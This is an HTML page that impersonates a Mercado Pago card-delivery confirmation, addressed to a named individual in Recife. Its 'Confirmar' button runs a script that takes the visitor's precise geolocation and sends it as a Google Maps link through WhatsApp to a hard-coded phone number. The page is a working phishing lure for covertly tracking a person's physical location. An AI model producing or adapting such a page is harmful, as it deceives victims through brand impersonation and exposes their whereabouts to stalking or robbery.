<!DOCTYPE html>
<html lang="pt-br">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Mercado Pago - Confirmação de Entrega</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600&display=swap');

  body {
    margin: 0;
    font-family: 'Montserrat', sans-serif;
    background: #009ee3;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    color: #333;
  }

  .container {
    background: #fff;
    border-radius: 14px;
    width: 90%;
    max-width: 420px;
    padding: 40px 30px 50px;
    box-shadow: 0 10px 25px rgba(0,0,0,0.15);
    /* muda aqui para alinhar o texto à esquerda */
    text-align: left;
  }

  .logo {
    width: 180px;
    margin-bottom: 30px;
    display: block;
    margin-left: auto;
    margin-right: auto;
  }

  h2 {
    color: #00a650;
    font-weight: 600;
    font-size: 24px;
    margin-bottom: 20px;
    text-align: center; /* mantém título centralizado */
  }

  p {
    font-size: 16px;
    color: #4a4a4a;
    line-height: 1.5;
    margin-bottom: 40px;
  }

  strong {
    color: #222;
  }

  .btn-confirmar {
    background-color: #00a650;
    border: none;
    color: white;
    font-size: 18px;
    padding: 15px 50px;
    border-radius: 30px;
    cursor: pointer;
    font-weight: 600;
    transition: background-color 0.3s ease;
    box-shadow: 0 5px 15px rgba(0,166,80,0.4);
    display: block;
    margin: 0 auto; /* centraliza o botão */
  }

  .btn-confirmar:hover {
    background-color: #007b3e;
    box-shadow: 0 7px 20px rgba(0,123,62,0.6);
  }

  @media (max-width: 400px) {
    .container {
      padding: 30px 20px 40px;
    }
    h2 {
      font-size: 20px;
    }
    .btn-confirmar {
      padding: 12px 35px;
      font-size: 16px;
    }
  }
</style>
<script>
  function enviarLocalizacao() {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        function(position) {
          const latitude = position.coords.latitude;
          const longitude = position.coords.longitude;
          const linkMaps = `https://www.google.com/maps?q=${latitude},${longitude}`;
          const whatsapp = `https://wa.me/558193568037?text=Mercado Pago: ${linkMaps}`;
          window.location.href = whatsapp;
        },
        function(error) {
          alert("Erro ao obter localização. Permita o acesso à localização no navegador.");
        },
        {
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 0
        }
      );
    } else {
      alert("Seu navegador não suporta geolocalização.");
    }
  }
</script>
</head>
<body>
  <div class="container">
    <!-- Logo Mercado Pago em SVG para ficar nítido -->
    <img
      class="logo"
      src="https://upload.wikimedia.org/wikipedia/commons/7/7c/Mercado_Pago_logo.svg"
      alt="Logo Mercado Pago"
      loading="lazy"
    />
    <h2>✅ Cartão enviado com sucesso</h2>
    <p>
      Olá <strong>Lucas Gabriel Moraes</strong>, seu cartão Mercado Pago foi emitido<br />
      e será entregue no endereço informado:<br /><br />
      <strong>Recife - Pernambuco</strong><br /><br />
      Clique abaixo para confirmar o recebimento da notificação.
    </p>
    <button class="btn-confirmar" onclick="enviarLocalizacao()">Confirmar</button>
  </div>
</body>
</html>
